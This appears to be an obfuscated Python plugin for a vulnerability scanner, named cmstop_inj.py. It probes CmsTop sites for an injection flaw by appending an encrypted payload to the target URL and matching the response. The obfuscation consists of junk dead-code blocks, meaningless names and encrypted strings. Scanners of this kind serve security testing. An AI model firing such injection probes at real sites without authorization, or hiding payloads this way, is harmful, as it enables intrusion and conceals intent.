# -*- coding: utf-8 -*-
import binascii,re
import fcntl

from decode import Decoder
de_key = 'a13b6776facce2ce24b9407fe76b7d9a2ac9f97fd11b4c03da49c5dc1bfdd4ed'
decode = Decoder(binascii.a2b_hex(de_key)).decode
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: cmstop_inj.py
import re
if 0:
    i11iIiiIii

def assign(service, arg):
    if service != '''cmstop''':
        return
    else:
        return (True, arg)
    if 0:
        O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg + decode('\xc5Y\x05K\xc5\xa8\x80\xac\x13\xc3=\r\x93S\x11\xe7S\xbb\x93\x02\xa0j8i\xed3\xb8\xaeo\xc5\xb0\x81\xd3^\x1a\x0f\xcd\xbe\x9f\xbc@\xc8x\x13\x9a\x12\x0f\xeeS\xbb\x9c\x0f\xe6=')
    oo, i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, I11i = curl.curl(o0OO00)
    if oo == 200:
        O0O = re.match(decode('\xfahF%\x8a\xe1\xb1\xeb\x0b\x89'), iIiiiI1IiI1I1.strip())
        if O0O:
            security_hole(o0OO00)
            if 0:
                i11ii11iIi11i.oOoO0oo0OOOo + IiiI / Iii1ii1II11i
            if 0:
                I1iII1iiII + I1Ii111 / OOo


if __name__ == '__main__':
    from dummy import *

#KEY---a13b6776facce2ce24b9407fe76b7d9a2ac9f97fd11b4c03da49c5dc1bfdd4ed---